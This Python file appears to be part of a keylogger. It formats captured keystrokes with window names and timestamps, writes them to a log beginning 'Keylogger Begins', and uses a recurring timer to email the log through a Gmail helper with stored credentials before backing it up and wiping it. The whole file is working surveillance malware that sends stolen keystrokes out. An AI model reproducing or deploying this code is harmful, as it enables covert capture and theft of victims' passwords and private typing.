import data
import sendmail
import threading


class Write:

    def __init__(self):
        self.strLog = ''

    def store(self, lst):
        self.strLog = str('\n' + str(lst[0]['time']) + ' [' +
                          str(lst[0]['window']) + ']: Start\n')
        cnt = len(lst)
        for itm in lst:
            if len(str(itm['key'])) > 1:
                itm['key'] = ' [' + str(itm['key']) + '] '
            self.strLog += str(itm['key'], )
        self.strLog += str('\n' + str(lst[cnt - 1]['time']) + ' [' +
                           str(lst[cnt - 1]['window']) + ']: End\n\n', )
        # Can Include Character Checks here - Shift, Backspace, Delete etc etc
        self.write()

    def write(self):
        print(self.strLog)
        if data.Initialize.count == 0:
            with open(data.Initialize.filepath, 'w') as fle:
                fle.write("Keylogger Begins")
            self.report()
            data.Initialize.count += 1
        #print(self.strLog)
        with open(data.Initialize.filepath, 'a') as fle:
             fle.write(self.strLog)
        fle.close()
        return True

    def report(self):
        mailer = sendmail.Gmail()
        mailer.mail(email=data.Initialize.email, password=data.Initialize.password, filepath=data.Initialize.filepath)
        self.backup(data.Initialize.filepath)
        timer = threading.Timer(data.Initialize.time, self.report)
        timer.start()

    def backup(self, filepath):
        fin = open(filepath, "r")
        findata = fin.read()
        fin.close()
        fout = open(data.Initialize.filecopy, "a")
        fout.write(findata)
        fout.close()
        with open(data.Initialize.filepath, 'w') as fle:
            fle.write('')
        fle.close()